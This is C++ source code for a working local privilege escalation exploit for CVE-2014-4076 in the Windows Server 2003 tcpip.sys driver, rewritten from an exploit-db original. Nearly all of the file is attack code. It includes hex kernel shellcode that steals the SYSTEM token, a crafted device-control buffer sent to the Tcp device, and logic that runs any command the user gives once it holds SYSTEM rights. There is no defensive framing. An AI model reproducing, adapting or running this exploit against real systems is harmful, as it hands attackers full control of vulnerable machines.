// CVE-2014-4076 
// 
// Windows 2k3 tcpip.sys Privilege Escalation
// 
// 
// original from http://www.exploit-db.com/exploits/35936/
// rewritten by ChiChou<zhouz@knownsec.com>
// 2015-02-03

#define INIT_DLL_FUNCTION(dll, name) name = reinterpret_cast<decltype(name)>(::GetProcAddress(::LoadLibrary(_T(dll)), #name));

#include "stdafx.h"
#include <iostream>
#include <string>
#include <Windows.h>

#define BUF_SIZE 1024
#define TIMEOUT 3000

typedef struct _IO_STATUS_BLOCK {
	union {
		NTSTATUS Status;
		PVOID Pointer;
	} DUMMYUNIONNAME;

	ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef void (WINAPI * PIO_APC_ROUTINE)(PVOID, PIO_STATUS_BLOCK, ULONG);

NTSTATUS(WINAPI *NtAllocateVirtualMemory)(
	_In_ HANDLE ProcessHandle,
	_In_ _Out_ PVOID BaseAddress,
	_In_ ULONG ZeroBits,
	_In_ _Out_ PULONG AllocationSize,
	_In_ ULONG AllocationType,
	_In_ ULONG Protect
	);

NTSTATUS(WINAPI *ZwDeviceIoControlFile)(
	_In_       HANDLE FileHandle,
	_In_opt_   HANDLE Event,
	_In_opt_   PIO_APC_ROUTINE ApcRoutine,
	_In_opt_   PVOID ApcContext,
	_Out_      PIO_STATUS_BLOCK IoStatusBlock,
	_In_       ULONG IoControlCode,
	_In_opt_   PVOID InputBuffer,
	_In_       ULONG InputBufferLength,
	_Out_opt_  PVOID OutputBuffer,
	_In_       ULONG OutputBufferLength
	);


class Exploit {
public: 
	static void Run(DWORD);
	static void Die(const char*);
	static void Spawn(_TCHAR*);
	static void DelayExecute(_TCHAR*);
};

void Exploit::Die(const char* message)
{
	std::wcout << message << std::endl;
	ExitProcess(1);
}

void Exploit::Run(DWORD pid)
{
	char buf[] = "\x00\x04\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x02\x00\x00\x22"
		"\x00\x00\x00\x04\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00";

	char shellcode[] = "\x60\x64\xA1\x24\x01\x00\x00\x8B\x40\x38\x50\xBB\x04\x00\x00"
		"\x00\x8B\x80\x98\x00\x00\x00\x2D\x98\x00\x00\x00\x39\x98\x94\x00\x00\x00\x75"
		"\xED\x8B\xB8\xD8\x00\x00\x00\x83\xE7\xF8\x58\xBB\x41\x41\x41\x41\x8B\x80\x98"
		"\x00\x00\x00\x2D\x98\x00\x00\x00\x39\x98\x94\x00\x00\x00\x75\xED\x89\xB8\xD8"
		"\x00\x00\x00\x61\xBA\x39\xff\xa2\xba\xB9\x00\x00\x00\x00\xB8\x3B\x00\x00\x00"
		"\x8E\xE0\x0F\x35\x00";

	*(PULONG)(shellcode + 46) = pid;
	// memcpy(shellcode + 46, &pid, sizeof(ULONG));

	HANDLE hDevice = CreateFileA("\\\\.\\Tcp", FILE_SHARE_WRITE |
		FILE_SHARE_READ, 0, NULL, OPEN_EXISTING, 0, NULL);

	if (FAILED(hDevice)) Die("[!] could not open handle into the TCP device");

	std::wcout << "[+] allocating memory" << std::endl;

	INIT_DLL_FUNCTION("NTDLL.DLL", NtAllocateVirtualMemory);
	INIT_DLL_FUNCTION("NTDLL.DLL", ZwDeviceIoControlFile);

	ULONG base = 0x1000, size = 0x4000;
	NTSTATUS status = NtAllocateVirtualMemory((HANDLE)-1, &base, 0x0, &size, 0x1000 | 0x2000, 0x40);
	if (status) Die("[!] could not allocate memory...");

	std::wcout << "[+] writting relevant memory..." << std::endl;

	WriteProcessMemory((HANDLE)-1, (LPVOID)0x28, "\x87\xff\xff\x38", 4, NULL);
	WriteProcessMemory((HANDLE)-1, (LPVOID)0x38, "\x00\x00", 2, NULL);
	WriteProcessMemory((HANDLE)-1, (LPVOID)0x1100, buf, sizeof(buf)-1, NULL);
	WriteProcessMemory((HANDLE)-1, (LPVOID)0x2b, "\x00\x00", 2, NULL);
	WriteProcessMemory((HANDLE)-1, (LPVOID)0x2000, shellcode, sizeof(shellcode)-1, NULL);

	std::wcout << "[+] sending payload" << std::endl;

	ULONG io_status = 8;
	ZwDeviceIoControlFile(hDevice, NULL, NULL, NULL, (PIO_STATUS_BLOCK)&io_status, 0x00120028, (PVOID)0x1100, sizeof(buf)-1, NULL, 0);
}

void Exploit::Spawn(_TCHAR *path)
{
	// spawn 
	ULONG nCurrentPid = GetCurrentProcessId();
	_TCHAR szCommand[BUF_SIZE];

	STARTUPINFO si = {0};
	si.cb = sizeof(STARTUPINFO);
	si.lpDesktop = L"WinSta0\\Default";
	
	PROCESS_INFORMATION pi;
	swprintf_s(szCommand, L"%s /pid %lu", path, nCurrentPid);
	if (!CreateProcess(NULL, szCommand, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &si, &pi))
		Die("[!] unable to spawn self.");
}

void Exploit::DelayExecute(_TCHAR *command)
{
	DWORD dwStarted = GetTickCount();
	_TCHAR name[BUF_SIZE];
	DWORD dwSize = BUF_SIZE;
	for (;;)
	{ 
		GetUserName(name, &dwSize);

		if (_tcscmp(name, L"SYSTEM") == 0) {
			_TCHAR szCommand[BUF_SIZE];
			STARTUPINFO si = { 0 };
			si.cb = sizeof(STARTUPINFO);
			si.lpDesktop = L"WinSta0\\Default";

			PROCESS_INFORMATION pi;
			swprintf_s(szCommand, L"%s", command);
			if (!CreateProcess(NULL, szCommand, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
				Die("[!] unable to execute command");

			break;
		}

		Sleep(40);

		if ((GetTickCount() - dwStarted > TIMEOUT))
		{
			std::wcout << "[!] Operation timed out." << std::endl;
			break;
		}
	}
}

int _tmain(int argc, _TCHAR* argv[])
{
	if (argc == 1) {
		std::wcout << "Usage: " << argv[0] << " \"command\"" << std::endl;
		return 0;
	}

	if (argc == 3 && _tcsicmp(argv[1], L"/pid") == 0)
	{
		try {
			ULONG pid = std::stoul(argv[2]);
			Exploit::Run(pid);
		}
		catch (const std::exception) {
			std::wcout << "[!] invalid pid parameter.";
		}
		return 0;
	}

	Exploit::Spawn(argv[0]);
	Exploit::DelayExecute(argv[1]);

	return 0;
}

